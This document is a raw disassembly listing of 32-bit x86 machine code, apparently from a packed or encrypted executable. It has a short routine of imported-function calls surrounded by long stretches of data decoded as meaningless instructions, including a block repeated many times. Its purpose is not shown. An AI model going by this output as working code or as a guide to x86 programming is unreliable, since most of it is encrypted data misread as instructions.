  422ad6:	aas    
  422ad7:	popf   
  422ad8:	adc    al,0x2b
  422ada:	loop   0x422b15
  422adc:	mov    bh,0x91
  422ade:	mov    WORD PTR [ebx-0x1d9c354f],?
  422ae4:	retf   
  422ae5:	mov    ds:0x8270778b,al
  422aea:	push   ebp
  422aeb:	mov    dh,0x4
  422aed:	aas    
  422aee:	mov    eax,ds:0x3cb42442
  422af3:	xor    edi,eax
  422af5:	sub    edi,DWORD PTR [ebp+0x33]
  422af8:	inc    eax
  422af9:	ja     0x422a96
  422afb:	in     eax,0x37
  422afd:	cmc    
  422afe:	pusha  
  422aff:	sub    BYTE PTR [edx+ebx*8-0x45],dl
  422b03:	mov    bl,0x52
  422b05:	add    al,0xd7
  422b07:	daa    
  422b08:	pop    ds
  422b09:	jne    0x422b38
  422b0b:	fdivr  QWORD PTR [esi-0x80]
  422b0e:	inc    esi
  422b0f:	scas   eax,DWORD PTR es:[edi]
  422b10:	call   0x19177d03
  422b15:	imul   eax,eax,0x35
  422b18:	jmp    0x422b24
  422b1a:	pop    DWORD PTR [eax+0x3f]
  422b1d:	adc    cl,dl
  422b1f:	out    0xad,eax
  422b21:	xor    edi,DWORD PTR [edi+0x4e]
  422b24:	je     0x422b18
  422b26:	inc    edx
  422b27:	cmp    al,0xa3
  422b29:	cmp    DWORD PTR [ebp-0x27ef13e],0x15
  422b30:	cwde   
  422b31:	ret    0x620e
  422b34:	ret    
  422b35:	mov    eax,ds:0x41971b1b
  422b3a:	add    esp,esi
  422b3c:	xor    dh,al
  422b3e:	mov    dh,0xa2
  422b40:	inc    ebx
  422b41:	repnz mov dl,BYTE PTR ds:0xb51fd2f1
  422b48:	inc    ebp
  422b49:	jp     0x422b17
  422b4b:	ror    dl,0x51
  422b4e:	cwde   
  422b4f:	scas   eax,DWORD PTR es:[edi]
  422b50:	dec    edi
  422b51:	or     ah,BYTE PTR [esi-0x665ea42d]
  422b57:	mov    esp,0xf92b9cd4
  422b5c:	mov    al,ds:0xaa92a63e
  422b61:	mov    ebp,0xcad594cb
  422b66:	adc    dh,BYTE PTR [edx+eax*2]
  422b69:	mov    BYTE PTR [esi+0x7b8a6371],dh
  422b6f:	enter  0xb626,0xd7
  422b73:	sub    bh,al
  422b75:	add    eax,0xc451205a
  422b7a:	adc    eax,ebx
  422b7c:	or     al,0xd1
  422b7e:	fs and edi,ecx
  422b81:	xor    eax,DWORD PTR [ecx+eax*8]
  422b84:	jo     0x422b91
  422b86:	xchg   DWORD PTR [esi-0x70],eax
  422b89:	je     0x422c04
  422b8b:	(bad)  
  422b8c:	dec    ebx
  422b8d:	out    dx,al
  422b8e:	mov    DWORD PTR [ecx-0x39],0xc686c2f5
  422b95:	cs scas eax,DWORD PTR es:[edi]
  422b97:	jo     0x422b7e
  422b99:	and    al,0x9f
  422b9b:	scas   eax,DWORD PTR es:[edi]
  422b9c:	sbb    BYTE PTR [edi-0x3f529012],0xd5
  422ba3:	xchg   BYTE PTR ds:[edi],al
  422ba6:	inc    ebx
  422ba7:	pop    edi
  422ba8:	sbb    bh,BYTE PTR [ebx+0x5c]
  422bab:	or     al,0x51
  422bad:	mov    dl,0x9a
  422baf:	(bad)  
  422bb0:	add    esp,DWORD PTR ds:0x2a3bd9c5
  422bb6:	mov    ebp,0x6b20b8e2
  422bbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bbc:	cmp    eax,0x9bd4d814
  422bc1:	xchg   ebp,eax
  422bc2:	and    al,0x82
  422bc4:	(bad)  
  422bc5:	rcl    eax,cl
  422bc7:	neg    DWORD PTR [edi-0x7a]
  422bca:	push   esp
  422bcb:	fisttp DWORD PTR [esi+0x39f37ded]
  422bd1:	(bad)  
  422bd2:	int    0x24
  422bd4:	push   0x36
  422bd6:	fimul  WORD PTR [eax+esi*2+0x3]
  422bda:	push   0x4c984201
  422bdf:	das    
  422be0:	clc    
  422be1:	shr    ecx,1
  422be3:	call   0x2e5b4fb8
  422be8:	pop    ebp
  422be9:	xor    DWORD PTR [ebx],eax
  422beb:	push   ds
  422bec:	jbe    0x422c45
  422bee:	enter  0xfab,0xea
  422bf2:	and    DWORD PTR [edi-0x33],esi
  422bf5:	xchg   esp,eax
  422bf6:	mov    ch,0x3c
  422bf8:	div    BYTE PTR [edx+0x11]
  422bfb:	(bad)  
  422bfc:	lea    eax,[esi+0x32]
  422bff:	std    
  422c00:	mov    ah,0x36
  422c02:	mov    edx,0x322b3e7c
  422c07:	jmp    0x1c0057b7
  422c0c:	ds inc edi
  422c0e:	adc    ebx,DWORD PTR [eax-0x78]
  422c11:	xor    DWORD PTR [ebx*8-0x3b09cf35],ebx
  422c18:	push   ecx
  422c19:	push   ecx
  422c1a:	test   DWORD PTR [ecx-0x12],edi
  422c1d:	dec    edi
  422c1e:	mov    bh,0xd7
  422c20:	(bad)  [ecx+0x60a7655]
  422c26:	imul   ch
  422c28:	(bad)  
  422c29:	mov    al,BYTE PTR [edi-0x1f15f0de]
  422c2f:	aam    0xb7
  422c31:	jns    0x422c37
  422c33:	iret   
  422c34:	sbb    DWORD PTR [esi],0xdc269500
  422c3a:	ret    0x819b
  422c3d:	mov    ds:0xcd84fde1,al
  422c42:	and    DWORD PTR [ebp+eiz*8-0x3a329f87],eax
  422c49:	fmulp  st(4),st
  422c4b:	or     ebx,DWORD PTR [eax+ebp*4+0x7232d6a4]
  422c52:	(bad)  
  422c53:	pop    esi
  422c54:	mov    esp,DWORD PTR [ecx-0x42]
  422c57:	(bad)  
  422c58:	mov    esp,0x81cd2ff0
  422c5d:	stc    
  422c5e:	or     BYTE PTR [ebp-0x3d],0x87
  422c62:	mov    BYTE PTR [esi],dl
  422c64:	mov    ch,cl
  422c66:	mov    al,ds:0x4a5af1ef
  422c6b:	sahf   
  422c6c:	push   0xae7cbe11
  422c71:	xor    al,0x6c
  422c73:	inc    eax
  422c74:	sub    eax,ecx
  422c76:	inc    ebp
  422c77:	(bad)  
  422c78:	shr    BYTE PTR ds:0x9a700925,cl
  422c7e:	mov    BYTE PTR [ebx],dh
  422c80:	push   ecx
  422c81:	shl    DWORD PTR ds:0x4f6118b7,0xaa
  422c88:	es mov dh,0xc2
  422c8b:	mov    al,ds:0xfbf9a310
  422c90:	fdivr  st(0),st
  422c92:	fmul   QWORD PTR [ecx-0x18]
  422c95:	aaa    
  422c96:	rol    DWORD PTR [edi-0x7273bf75],cl
  422c9c:	dec    edi
  422c9d:	xchg   ebp,eax
  422c9e:	add    ch,BYTE PTR [ebx-0x5cb9f68]
  422ca4:	sub    edx,DWORD PTR [ecx-0x1ff531a6]
  422caa:	push   ebp
  422cab:	loopne 0x422ceb
  422cad:	std    
  422cae:	jmp    0xe39e2680
  422cb3:	pop    edx
  422cb4:	cwde   
  422cb5:	cli    
  422cb6:	nop
  422cb7:	ins    DWORD PTR es:[edi],dx
  422cb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cb9:	jb     0x422c79
  422cbb:	xchg   DWORD PTR [eax-0x365b8057],ebx
  422cc1:	xchg   edi,eax
  422cc2:	mov    ds:0x575ed74a,eax
  422cc7:	push   es
  422cc8:	cs aaa 
  422cca:	sub    eax,DWORD PTR [ebx+0x238be0ec]
  422cd0:	sub    al,0x95
  422cd2:	scas   al,BYTE PTR es:[edi]
  422cd3:	pop    ebp
  422cd4:	mov    dh,0x5e
  422cd6:	mov    esp,0x71249b41
  422cdb:	mov    bl,0xd4
  422cdd:	fst    DWORD PTR [edx-0x3a]
  422ce0:	sar    DWORD PTR [edi+0x76],0x17
  422ce4:	sub    BYTE PTR [ebx+0x77ee653a],bl
  422cea:	cli    
  422ceb:	stos   BYTE PTR es:[edi],al
  422cec:	mov    al,0x8e
  422cee:	add    dl,0x1d
  422cf1:	pop    esp
  422cf2:	sti    
  422cf3:	daa    
  422cf4:	sub    al,0xb3
  422cf6:	das    
  422cf7:	mov    BYTE PTR [esi+0x9480bdf],0xf0
  422cfe:	mov    ecx,0x6b36f92b
  422d03:	and    eax,0x1ffaad0f
  422d08:	sub    ebp,DWORD PTR [ebx-0x180a787b]
  422d0e:	les    ecx,FWORD PTR [eax-0x74e723be]
  422d14:	lods   al,BYTE PTR ds:[esi]
  422d15:	add    al,0xbd
  422d17:	int3   
  422d18:	ret    
  422d19:	pop    ebx
  422d1a:	or     ebp,DWORD PTR [ebx]
  422d1c:	jo     0x422cc4
  422d1e:	mov    edx,0xd50e585c
  422d23:	xor    DWORD PTR [edx+ebx*4+0x7d96c3f9],edx
  422d2a:	sub    ebp,DWORD PTR ds:[edi-0x7b]
  422d2e:	push   0xffffffc4
  422d30:	inc    esp
  422d31:	data16 adc al,0x49
  422d34:	int    0x3
  422d36:	jbe    0x422d56
  422d38:	xor    eax,0x88aa4006
  422d3d:	sbb    ah,BYTE PTR [ebx]
  422d3f:	and    al,0xd
  422d41:	inc    eax
  422d42:	(bad)  
  422d43:	(bad)  
  422d44:	cmp    ecx,DWORD PTR [ebp-0x9]
  422d47:	repnz xchg ebp,eax
  422d49:	cmp    al,0xde
  422d4b:	cmc    
  422d4c:	sbb    eax,0x68753903
  422d51:	dec    esp
  422d52:	pop    edi
  422d53:	(bad)  
  422d55:	xchg   esp,eax
  422d56:	add    al,0x15
  422d58:	jp     0x422d18
  422d5a:	jmp    0xd78a:0xd3459a2b
  422d61:	inc    esi
  422d62:	repnz out 0xc5,eax
  422d65:	std    
  422d66:	sub    eax,0x491a7d6c
  422d6b:	bound  ebp,QWORD PTR [esi]
  422d6d:	rcl    ecx,0x4f
  422d70:	xlat   BYTE PTR ds:[ebx]
  422d71:	adc    BYTE PTR [edi-0x30],dl
  422d74:	push   cs
  422d75:	mov    edi,0x2896c2af
  422d7a:	cmp    eax,0x402337d2
  422d7f:	scas   al,BYTE PTR es:[edi]
  422d80:	adc    BYTE PTR [edx-0x21],al
  422d83:	push   ebx
  422d84:	clc    
  422d85:	xchg   DWORD PTR [edi],esp
  422d87:	jl     0x422d4e
  422d89:	repnz idiv BYTE PTR [esi]
  422d8c:	test   BYTE PTR [edi+eax*4],bh
  422d8f:	les    eax,FWORD PTR [ecx]
  422d91:	mov    ch,0xb5
  422d93:	pop    es
  422d94:	arpl   cx,cx
  422d96:	mov    BYTE PTR [edi-0x14230d02],dl
  422d9c:	fidivr DWORD PTR [edx]
  422d9e:	adc    al,0x5a
  422da0:	xor    al,cl
  422da2:	inc    esp
  422da3:	pop    es
  422da4:	push   esp
  422da5:	inc    ebp
  422da6:	mov    DWORD PTR [esi-0x5537b61c],ebp
  422dac:	in     al,dx
  422dad:	int    0x6f
  422daf:	sub    eax,esi
  422db1:	daa    
  422db2:	adc    BYTE PTR [ebp-0x1a],bh
  422db5:	mov    esp,0x25bd7bf2
  422dba:	dec    esi
  422dbb:	and    ebp,esp
  422dbd:	jl     0x422dff
  422dbf:	inc    eax
  422dc0:	adc    DWORD PTR [eax],edx
  422dc2:	adc    dh,BYTE PTR [ebx+edi*2-0x2e7cdbf7]
  422dc9:	test   BYTE PTR [eax-0x126bb768],cl
  422dcf:	lds    eax,FWORD PTR [eax]
  422dd1:	bnd jbe 0x422e02
  422dd4:	ret    
  422dd5:	adc    eax,DWORD PTR [eax]
  422dd7:	mov    ch,ch
  422dd9:	mov    DWORD PTR [eax-0x19a6ba31],eax
  422ddf:	js     0x422d68
  422de1:	sti    
  422de2:	add    al,bl
  422de4:	cmp    cl,dl
  422de6:	in     eax,dx
  422de7:	push   ebp
  422de8:	sbb    eax,eax
  422dea:	sar    ebp,cl
  422dec:	cmp    al,BYTE PTR [eax+0x1b8]
  422df2:	add    BYTE PTR [ebx-0x333ca21b],cl
  422df8:	int3   
  422df9:	int3   
  422dfa:	int3   
  422dfb:	int3   
  422dfc:	int3   
  422dfd:	int3   
  422dfe:	int3   
  422dff:	int3   
  422e00:	push   ebp
  422e01:	mov    ebp,esp
  422e03:	sub    esp,0x8
  422e06:	push   esi
  422e07:	push   0xffff
  422e0c:	push   0x0
  422e0e:	mov    DWORD PTR [ebp-0x4],0x0
  422e15:	call   DWORD PTR ds:0x42902c
  422e1b:	mov    esi,DWORD PTR ds:0x429034
  422e21:	push   0xa
  422e23:	push   0x0
  422e25:	push   0x0
  422e27:	push   0xffffffff
  422e29:	mov    DWORD PTR [ebp-0x8],esi
  422e2c:	call   0x424340
  422e31:	test   esi,esi
  422e33:	jne    0x422e3f
  422e35:	push   esi
  422e36:	push   0x1
  422e38:	push   esi
  422e39:	call   DWORD PTR ds:0x429028
  422e3f:	push   0x0
  422e41:	push   0x4e
  422e43:	push   0x1e
  422e45:	push   0x0
  422e47:	call   DWORD PTR ds:0x429024
  422e4d:	test   eax,eax
  422e4f:	je     0x422e59
  422e51:	push   0x0
  422e53:	call   DWORD PTR ds:0x429008
  422e59:	mov    esi,DWORD PTR [ebp-0x8]
  422e5c:	call   esi
  422e5e:	mov    DWORD PTR [ebp-0x4],eax
  422e61:	mov    esi,DWORD PTR [ebp-0x4]
  422e64:	cmp    esi,0x57
  422e67:	jne    0x422e7e
  422e69:	push   0x71106c5e
  422e6e:	call   0x411080
  422e73:	add    esp,0x4
  422e76:	push   0x0
  422e78:	call   DWORD PTR ds:0x429020
  422e7e:	push   0x5
  422e80:	push   esi
  422e81:	call   DWORD PTR ds:0x42913c
  422e87:	xor    eax,eax
  422e89:	pop    esi
  422e8a:	mov    esp,ebp
  422e8c:	pop    ebp
  422e8d:	ret    
  422e8e:	nop
  422e8f:	nop
  422e90:	sub    esp,0x10
  422e93:	push   0x0
  422e95:	push   0x0
  422e97:	push   0x0
  422e99:	call   DWORD PTR ds:0x429038
  422e9f:	push   0x0
  422ea1:	push   0x0
  422ea3:	call   DWORD PTR ds:0x429148
  422ea9:	lea    eax,[esp+0x0]
  422ead:	push   eax
  422eae:	call   DWORD PTR ds:0x429054
  422eb4:	call   DWORD PTR ds:0x429034
  422eba:	push   0x0
  422ebc:	push   0x0
  422ebe:	push   0x0
  422ec0:	call   0x424346
  422ec5:	cmp    WORD PTR [esp+0x0],0x0
  422ecb:	push   0x0
  422ecd:	je     0x422ee6
  422ecf:	push   0x0
  422ed1:	call   DWORD PTR ds:0x429130
  422ed7:	push   0x0
  422ed9:	call   0x422e00
  422ede:	add    esp,0x4
  422ee1:	jmp    0x42431e
  422ee6:	push   0x14
  422ee8:	push   0x0
  422eea:	push   0x0
  422eec:	call   DWORD PTR ds:0x429010
  422ef2:	call   FWORD PTR [eax-0x40]
  422ef5:	pushf  
  422ef6:	shr    DWORD PTR [eax],0x47
  422ef9:	(bad)  
  422efa:	xor    BYTE PTR ds:0x3b7ed863,bl
  422f00:	jmp    0xc647:0x2b790c9a
  422f07:	xor    BYTE PTR [ecx],bl
  422f09:	arpl   ax,bx
  422f0b:	les    edx,FWORD PTR ds:0x2bc10c9a
  422f12:	inc    edi
  422f13:	(bad)  
  422f14:	xor    BYTE PTR [ecx],bl
  422f16:	arpl   ax,bx
  422f18:	jle    0x422ede
  422f1a:	adc    eax,0x2bc10c9a
  422f1f:	inc    edi
  422f20:	(bad)  
  422f21:	xor    BYTE PTR [ecx],bl
  422f23:	arpl   ax,bx
  422f25:	jle    0x422eeb
  422f27:	adc    eax,0x2bc10c9a
  422f2c:	inc    edi
  422f2d:	(bad)  
  422f2e:	xor    cl,ah
  422f30:	arpl   ax,bx
  422f32:	jle    0x422efe
  422f34:	or     ah,BYTE PTR [eax]
  422f36:	add    al,cl
  422f38:	lahf   
  422f39:	dec    esi
  422f3a:	or     edx,DWORD PTR [ecx]
  422f3c:	mov    eax,ds:0xe5b39462
  422f41:	inc    ecx
  422f42:	repnz gs mov dl,0xb
  422f46:	aaa    
  422f47:	mov    ah,0x5f
  422f49:	jle    0x422f5c
  422f4b:	mov    ecx,0xfb76e413
  422f50:	bound  ebp,QWORD PTR [edi+0x52e63344]
  422f56:	jl     0x422f9b
  422f58:	stos   BYTE PTR es:[edi],al
  422f59:	or     ebp,DWORD PTR [edx-0x1e9d0ccb]
  422f5f:	outs   dx,DWORD PTR ds:[esi]
  422f60:	or     BYTE PTR [ebp-0x43f38bf0],dl
  422f66:	sbb    ebp,edx
  422f68:	sbb    BYTE PTR [edi+0x472be506],dl
  422f6e:	(bad)  
  422f6f:	xor    BYTE PTR [ecx],bl
  422f71:	arpl   ax,bx
  422f73:	jns    0x422fd2
  422f75:	jmp    0xb97b7f3d
  422f7a:	dec    ebp
  422f7b:	test   eax,ecx
  422f7d:	mov    ebp,DWORD PTR [ecx-0x65]
  422f80:	xchg   BYTE PTR [esi+0x1f],dl
  422f83:	ret    0xcd69
  422f86:	and    DWORD PTR [eax],ebx
  422f88:	mov    ds:0x46bd3b13,al
  422f8e:	into   
  422f8f:	xlat   BYTE PTR ds:[ebx]
  422f90:	bound  ebx,QWORD PTR [esi-0xdd8c35]
  422f96:	cmp    dh,BYTE PTR [ecx-0x65]
  422f99:	dec    edx
  422f9a:	je     0x422f84
  422f9c:	fwait
  422f9d:	mov    ds:0xd5d38706,eax
  422fa2:	int3   
  422fa3:	jp     0x422f3e
  422fa5:	jb     0x422f79
  422fa7:	xor    al,0x3c
  422fa9:	xchg   DWORD PTR [eax+0x4d2a4146],edx
  422faf:	sahf   
  422fb0:	enter  0x698b,0x9b
  422fb4:	xchg   BYTE PTR [edi+0x1f],dl
  422fb7:	mov    dl,0xf5
  422fb9:	push   ebx
  422fba:	and    eax,edi
  422fbc:	push   ds
  422fbd:	mov    al,0x13
  422fbf:	cs and ah,ch
  422fc2:	into   
  422fc3:	dec    ebp
  422fc4:	push   DWORD PTR [ecx]
  422fc6:	retf   
  422fc7:	and    edi,DWORD PTR [edi+0x6413a54]
  422fcd:	shl    BYTE PTR [esi+eax*4-0x13],1
  422fd1:	or     BYTE PTR [esi],al
  422fd3:	cdq    
  422fd4:	dec    esi
  422fd5:	dec    eax
  422fd6:	int3   
  422fd7:	jb     0x422fba
  422fd9:	icebp  
  422fda:	shr    BYTE PTR [ebp*4+0x394ff276],cl
  422fe1:	mov    ecx,0x1930c64d
  422fe6:	arpl   ax,bx
  422fe8:	jle    0x422fae
  422fea:	adc    eax,0x2bc149ca
  422fef:	or     eax,edi
  422ff1:	xor    bl,BYTE PTR [ecx]
  422ff3:	(bad)  
  422ff4:	cmp    esp,DWORD PTR [ecx]
  422ff6:	mov    edx,DWORD PTR ds:0x2bc10c9a
  422ffc:	inc    edi
  422ffd:	(bad)  
  422ffe:	xor    cl,bh
  423000:	arpl   bx,bx
  423002:	jg     0x422fd3
  423004:	adc    al,0x90
  423006:	or     al,0xc1
  423008:	mov    DWORD PTR [ebx-0x3a],0xd8651d30
  42300f:	jle    0x422fd5
  423011:	adc    eax,0x2b7c0d9a
  423016:	inc    edi
  423017:	(bad)  
  423018:	and    BYTE PTR [ecx],bl
  42301a:	arpl   ax,bx
  42301c:	jle    0x422fdf
  42301e:	adc    eax,0x2b800c9a
  423023:	inc    edi
  423024:	(bad)  
  423025:	xor    BYTE PTR [ecx],bl
  423027:	arpl   dx,bx
  423029:	jle    0x422fef
  42302b:	adc    BYTE PTR [edx+0x472bc10d],bl
  423031:	(bad)  
  423032:	xor    BYTE PTR [ebx+eiz*2],bl
  423035:	fnstcw WORD PTR [esi-0x3c]
  423038:	adc    eax,0xabc10c9a
  42303d:	dec    esp
  42303e:	(bad)  
  42303f:	xor    BYTE PTR ds:0xf5c3d863,bl
  423045:	adc    BYTE PTR [edx-0x38d43ef2],bl
  42304b:	(bad)  
  42304c:	xor    BYTE PTR [ecx],cl
  42304e:	arpl   ax,bx
  423050:	outs   dx,BYTE PTR ds:[esi]
  423051:	les    edx,FWORD PTR ds:0x2bd10c9a
  423057:	inc    edi
  423058:	(bad)  
  423059:	xor    BYTE PTR [ecx],bl
  42305b:	arpl   ax,bx
  42305d:	jle    0x423023
  42305f:	add    eax,0x2bc10c9a
  423064:	inc    edi
  423065:	(bad)  
  423066:	xor    BYTE PTR [ecx],bl
  423068:	arpl   ax,bx
  42306a:	jle    0x4230ac
  42306c:	jnp    0x422fff
  42306e:	or     al,0xa8
  423070:	sub    BYTE PTR [edi-0x3a],al
  423073:	xor    BYTE PTR [ecx],ch
  423075:	push   0x15f9b1d8
  42307a:	call   0x30c6:0x472bc10c
  423081:	sbb    DWORD PTR [ebx-0x28],esp
  423084:	jle    0x42304a
  423086:	adc    eax,0x2bc10c9a
  42308b:	inc    edi
  42308c:	(bad)  
  42308d:	xor    BYTE PTR [ecx],bl
  42308f:	arpl   ax,bx
  423091:	jle    0x423057
  423093:	adc    eax,0x2bc10c9a
  423098:	inc    edi
  423099:	(bad)  
  42309a:	xor    BYTE PTR [ecx],bl
  42309c:	arpl   ax,bx
  42309e:	jle    0x423064
  4230a0:	adc    eax,0x2bc10c9a
  4230a5:	inc    edi
  4230a6:	(bad)  
  4230a7:	xor    BYTE PTR [ecx],bl
  4230a9:	arpl   ax,bx
  4230ab:	jle    0x423071
  4230ad:	adc    eax,0x2bc10c9a
  4230b2:	inc    edi
  4230b3:	(bad)  
  4230b4:	xor    BYTE PTR [ecx],bl
  4230b6:	arpl   ax,bx
  4230b8:	jle    0x42307e
  4230ba:	adc    eax,0x2bc10c9a
  4230bf:	inc    edi
  4230c0:	(bad)  
  4230c1:	xor    BYTE PTR [ecx],bl
  4230c3:	arpl   ax,bx
  4230c5:	jle    0x42308b
  4230c7:	adc    eax,0x2bc10c9a
  4230cc:	inc    edi
  4230cd:	(bad)  
  4230ce:	xor    BYTE PTR [ecx],bl
  4230d0:	arpl   ax,bx
  4230d2:	jle    0x423098
  4230d4:	adc    eax,0x2bc10c9a
  4230d9:	inc    edi
  4230da:	(bad)  
  4230db:	xor    BYTE PTR [ecx],bl
  4230dd:	arpl   ax,bx
  4230df:	jle    0x4230a5
  4230e1:	adc    eax,0x4eb5229a
  4230e6:	aas    
  4230e7:	mov    dl,0x30
  4230e9:	sbb    DWORD PTR [ebx-0x28],esp
  4230ec:	pop    esi
  4230ed:	iret   
  4230ee:	adc    eax,0x2bc11c9a
  4230f3:	inc    edi
  4230f4:	cld    
  4230f5:	xor    al,0x19
  4230f7:	arpl   sp,bx
  4230f9:	jle    0x4230bf
  4230fb:	inc    ebp
  4230fc:	fisttp WORD PTR [edi-0xd]
  4230ff:	jg     0x423109
  423101:	(bad)  
  423102:	xor    BYTE PTR [ecx],bl
  423104:	arpl   ax,bx
  423106:	jle    0x4230ec
  423108:	adc    eax,0x59efec9a
  42310d:	xor    al,0xb4
  42310f:	push   ebx
  423110:	sbb    DWORD PTR [ebx-0x28],esp
  423113:	jle    0x4230a9
  423115:	adc    eax,0x20f10c9a
  42311a:	inc    edi
  42311b:	(bad)  
  42311c:	pusha  
  42311d:	sbb    DWORD PTR [ebx-0x28],esp
  423120:	inc    eax
  423121:	rcl    BYTE PTR ds:0x2bc10c9a,0x47
  423128:	(bad)  
  423129:	xor    BYTE PTR [ecx],bl
  42312b:	arpl   ax,bx
  42312d:	jle    0x4230f3
  42312f:	xor    eax,0x2b210c9a
  423134:	inc    edi
  423135:	(bad)  
  423136:	xor    BYTE PTR [ecx],bl
  423138:	arpl   ax,bx
  42313a:	jle    0x423100
  42313c:	adc    eax,0x2bc10c9a
  423141:	inc    edi
  423142:	(bad)  
  423143:	xor    BYTE PTR [ecx],bl
  423145:	arpl   ax,bx
  423147:	jle    0x42310d
  423149:	adc    eax,0x2bc10c9a
  42314e:	inc    edi
  42314f:	(bad)  
  423150:	xor    BYTE PTR [ecx],bl
  423152:	arpl   ax,bx
  423154:	jle    0x42311a
  423156:	adc    eax,0x2bc10c9a
  42315b:	inc    edi
  42315c:	(bad)  
  42315d:	xor    BYTE PTR [ecx],bl
  42315f:	arpl   ax,bx
  423161:	jle    0x423127
  423163:	adc    eax,0x2bc10c9a
  423168:	inc    edi
  423169:	(bad)  
  42316a:	xor    BYTE PTR [ecx],bl
  42316c:	arpl   ax,bx
  42316e:	jle    0x423134
  423170:	adc    eax,0x2bc10c9a
  423175:	inc    edi
  423176:	(bad)  
  423177:	xor    BYTE PTR [ecx],bl
  423179:	arpl   ax,bx
  42317b:	jle    0x423141
  42317d:	adc    eax,0x2bc10c9a
  423182:	inc    edi
  423183:	(bad)  
  423184:	xor    BYTE PTR [ecx],bl
  423186:	arpl   ax,bx
  423188:	jle    0x42314e
  42318a:	adc    eax,0x2bc10c9a
  42318f:	inc    edi
  423190:	(bad)  
  423191:	xor    BYTE PTR [ecx],bl
  423193:	arpl   ax,bx
  423195:	jle    0x42315b
  423197:	adc    eax,0x2bc10c9a
  42319c:	inc    edi
  42319d:	(bad)  
  42319e:	xor    BYTE PTR [ecx],bl
  4231a0:	arpl   ax,bx
  4231a2:	jle    0x423168
  4231a4:	adc    eax,0x2bc10c9a
  4231a9:	inc    edi
  4231aa:	(bad)  
  4231ab:	xor    BYTE PTR [ecx],bl
  4231ad:	arpl   ax,bx
  4231af:	jle    0x423175
  4231b1:	adc    eax,0x2bc10c9a
  4231b6:	inc    edi
  4231b7:	(bad)  
  4231b8:	xor    BYTE PTR [ecx],bl
  4231ba:	arpl   ax,bx
  4231bc:	jle    0x423182
  4231be:	adc    eax,0x2bc10c9a
  4231c3:	inc    edi
  4231c4:	(bad)  
  4231c5:	xor    BYTE PTR [ecx],bl
  4231c7:	arpl   ax,bx
  4231c9:	jle    0x42318f
  4231cb:	adc    eax,0x2bc10c9a
  4231d0:	inc    edi
  4231d1:	(bad)  
  4231d2:	xor    BYTE PTR [ecx],bl
  4231d4:	arpl   ax,bx
  4231d6:	jle    0x42319c
  4231d8:	adc    eax,0x2bc10c9a
  4231dd:	inc    edi
  4231de:	(bad)  
  4231df:	xor    BYTE PTR [ecx],bl
  4231e1:	arpl   ax,bx
  4231e3:	jle    0x4231a9
  4231e5:	adc    eax,0x2bc10c9a
  4231ea:	inc    edi
  4231eb:	(bad)  
  4231ec:	xor    BYTE PTR [ecx],bl
  4231ee:	arpl   ax,bx
  4231f0:	jle    0x4231b6
  4231f2:	adc    eax,0x2bc10c9a
  4231f7:	inc    edi
  4231f8:	(bad)  
  4231f9:	xor    BYTE PTR [ecx],bl
  4231fb:	arpl   ax,bx
  4231fd:	jle    0x4231c3
  4231ff:	adc    eax,0x2bc10c9a
  423204:	inc    edi
  423205:	(bad)  
  423206:	xor    BYTE PTR [ecx],bl
  423208:	arpl   ax,bx
  42320a:	jle    0x4231d0
  42320c:	adc    eax,0x2bc10c9a
  423211:	inc    edi
  423212:	(bad)  
  423213:	xor    BYTE PTR [ecx],bl
  423215:	arpl   ax,bx
  423217:	jle    0x4231dd
  423219:	adc    eax,0x2bc10c9a
  42321e:	inc    edi
  42321f:	(bad)  
  423220:	xor    BYTE PTR [ecx],bl
  423222:	arpl   ax,bx
  423224:	jle    0x4231ea
  423226:	adc    eax,0x2bc10c9a
  42322b:	inc    edi
  42322c:	(bad)  
  42322d:	xor    BYTE PTR [ecx],bl
  42322f:	arpl   ax,bx
  423231:	jle    0x4231f7
  423233:	adc    eax,0x2bc10c9a
  423238:	inc    edi
  423239:	(bad)  
  42323a:	xor    BYTE PTR [ecx],bl
  42323c:	arpl   ax,bx
  42323e:	jle    0x423204
  423240:	adc    eax,0x2bc10c9a
  423245:	inc    edi
  423246:	(bad)  
  423247:	xor    BYTE PTR [ecx],bl
  423249:	arpl   ax,bx
  42324b:	jle    0x423211
  42324d:	adc    eax,0x2bc10c9a
  423252:	inc    edi
  423253:	(bad)  
  423254:	xor    BYTE PTR [ecx],bl
  423256:	arpl   ax,bx
  423258:	jle    0x42321e
  42325a:	adc    eax,0x2bc10c9a
  42325f:	inc    edi
  423260:	(bad)  
  423261:	xor    BYTE PTR [ecx],bl
  423263:	arpl   ax,bx
  423265:	jle    0x42322b
  423267:	adc    eax,0x2bc10c9a
  42326c:	inc    edi
  42326d:	(bad)  
  42326e:	xor    BYTE PTR [ecx],bl
  423270:	arpl   ax,bx
  423272:	jle    0x423238
  423274:	adc    eax,0x2bc10c9a
  423279:	inc    edi
  42327a:	(bad)  
  42327b:	xor    BYTE PTR [ecx],bl
  42327d:	arpl   ax,bx
  42327f:	jle    0x423245
  423281:	adc    eax,0x2bc10c9a
  423286:	inc    edi
  423287:	(bad)  
  423288:	xor    BYTE PTR [ecx],bl
  42328a:	arpl   ax,bx
  42328c:	jle    0x423252
  42328e:	adc    eax,0x2bc10c9a
  423293:	inc    edi
  423294:	(bad)  
  423295:	xor    BYTE PTR [ecx],bl
  423297:	arpl   ax,bx
  423299:	jle    0x42325f
  42329b:	adc    eax,0x2bc10c9a
  4232a0:	inc    edi
  4232a1:	(bad)  
  4232a2:	xor    BYTE PTR [ecx],bl
  4232a4:	arpl   ax,bx
  4232a6:	jle    0x42326c
  4232a8:	adc    eax,0x2bc10c9a
  4232ad:	inc    edi
  4232ae:	(bad)  
  4232af:	xor    BYTE PTR [ecx],bl
  4232b1:	arpl   ax,bx
  4232b3:	jle    0x423279
  4232b5:	adc    eax,0x2bc10c9a
  4232ba:	inc    edi
  4232bb:	(bad)  
  4232bc:	xor    BYTE PTR [ecx],bl
  4232be:	arpl   ax,bx
  4232c0:	jle    0x423286
  4232c2:	adc    eax,0x2bc10c9a
  4232c7:	inc    edi
  4232c8:	(bad)  
  4232c9:	xor    BYTE PTR [ecx],bl
  4232cb:	arpl   ax,bx
  4232cd:	jle    0x423293
  4232cf:	adc    eax,0x2bc10c9a
  4232d4:	inc    edi
  4232d5:	(bad)  
  4232d6:	xor    BYTE PTR [ecx],bl
  4232d8:	arpl   ax,bx
  4232da:	jle    0x4232a0
  4232dc:	adc    eax,0x2bc10c9a
  4232e1:	inc    edi
  4232e2:	(bad)  
  4232e3:	xor    BYTE PTR [ecx],bl
  4232e5:	arpl   ax,bx
  4232e7:	jle    0x4232ad
